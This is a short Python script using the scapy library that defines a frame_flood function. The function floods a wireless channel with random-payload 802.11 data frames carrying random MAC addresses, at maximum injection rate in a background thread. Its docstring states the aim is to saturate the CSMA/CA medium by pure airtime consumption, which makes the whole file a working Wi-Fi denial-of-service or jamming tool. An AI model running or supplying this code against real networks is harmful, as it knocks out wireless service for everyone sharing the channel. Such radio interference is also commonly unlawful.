import threading, time, os, random
from scapy.all import *

def frame_flood(iface, duration=30, rate=1000, counter=None):
    """
    Inject random-payload 802.11 frames to saturate CSMA/CA medium.
    No specific target — pure airtime consumption at maximum injection rate.
    """
    stop = threading.Event()
    if counter is None:
        counter = [0]

    def _flood():
        end = time.time() + duration
        while time.time() < end and not stop.is_set():
            payload = os.urandom(random.randint(100, 1400))
            frame = (RadioTap() /
                     Dot11(type=2, subtype=0,
                           addr1=RandMAC(), addr2=RandMAC(), addr3=RandMAC()) /
                     Raw(load=payload))
            sendp(frame, iface=iface, count=rate, inter=0, verbose=False)
            counter[0] += rate

    t = threading.Thread(target=_flood, daemon=True)
    t.start()
    print(f"[+] Frame flood started — rate: {rate} f/s, duration: {duration}s")
    return stop, counter
 